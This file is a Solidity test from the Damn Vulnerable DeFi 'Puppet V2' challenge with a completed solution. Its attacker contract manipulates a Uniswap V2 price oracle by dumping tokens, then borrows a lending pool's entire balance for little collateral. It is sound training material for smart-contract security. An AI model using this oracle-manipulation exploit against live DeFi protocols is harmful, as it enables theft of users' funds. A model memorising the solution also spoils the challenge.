// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

// Attacker contract to execute everything in a single transaction
contract PuppetV2Attacker {
    IUniswapV2Router02 private uniswapRouter;
    DamnValuableToken private token;
    WETH private weth;
    PuppetV2Pool private lendingPool;
    address private recovery;
    uint256 private poolInitialBalance;

    constructor(
        address _tokenAddress,
        address payable _wethAddress,
        address _uniswapRouterAddress,
        address _lendingPoolAddress,
        address _recoveryAddress,
        uint256 _poolInitialBalance
    ) {
        token = DamnValuableToken(_tokenAddress);
        weth = WETH(_wethAddress);
        uniswapRouter = IUniswapV2Router02(_uniswapRouterAddress);
        lendingPool = PuppetV2Pool(_lendingPoolAddress);
        recovery = _recoveryAddress;
        poolInitialBalance = _poolInitialBalance;
    }

    function attack() external payable {
        // Step 1: Approve tokens for the Uniswap router
        token.approve(address(uniswapRouter), type(uint256).max);
        
        // Step 2: Swap almost all tokens for WETH to manipulate the price
        uint256 tokensToSwap = token.balanceOf(address(this)) - 1e18; // Keep some tokens
        
        // Create the swap path: token -> WETH
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        
        // Execute the swap
        uniswapRouter.swapExactTokensForETH(
            tokensToSwap,
            1, // Accept any amount of ETH
            path,
            address(this), // Receive ETH here
            block.timestamp + 1 hours
        );
        
        // Step 3: Convert ETH to WETH
        weth.deposit{value: address(this).balance}();
        
        // Step 4: Approve WETH for the lending pool
        weth.approve(address(lendingPool), type(uint256).max);
        
        // Step 5: Borrow all tokens from the lending pool
        uint256 poolBalance = token.balanceOf(address(lendingPool));
        lendingPool.borrow(poolBalance);
        
        // Step 6: Transfer только токены из пула на recovery адрес
        token.transfer(recovery, poolInitialBalance);
        
        // Return any remaining ETH to the caller
        if (address(this).balance > 0) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }
    
    // To receive ETH from Uniswap router
    receive() external payable {}
}

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        console.log("\n[*] Initial state:");
        console.log("Player ETH balance:", player.balance);
        console.log("Player token balance:", token.balanceOf(player));
        console.log("Uniswap pair WETH balance:", weth.balanceOf(address(uniswapV2Exchange)));
        console.log("Uniswap pair token balance:", token.balanceOf(address(uniswapV2Exchange)));
        console.log("Lending pool token balance:", token.balanceOf(address(lendingPool)));
        
        // Calculate initial deposit required
        uint256 initialDepositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("Initial WETH deposit required to borrow all tokens:", initialDepositRequired);
        
        // Deploy the attacker contract
        PuppetV2Attacker attacker = new PuppetV2Attacker(
            address(token),
            payable(address(weth)),
            address(uniswapV2Router),
            address(lendingPool),
            recovery,
            POOL_INITIAL_TOKEN_BALANCE
        );
        
        // Transfer all tokens to the attacker contract
        token.transfer(address(attacker), token.balanceOf(player));
        
        console.log("\n[*] Executing attack in a single transaction...");
        
        // Execute the attack in a single transaction
        (bool success, ) = address(attacker).call{value: player.balance}(abi.encodeWithSignature("attack()"));
        require(success, "Attack failed");
        
        // Final state
        console.log("\n[*] Final state:");
        console.log("Player ETH balance:", player.balance);
        console.log("Recovery token balance:", token.balanceOf(recovery));
        console.log("Lending pool token balance:", token.balanceOf(address(lendingPool)));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
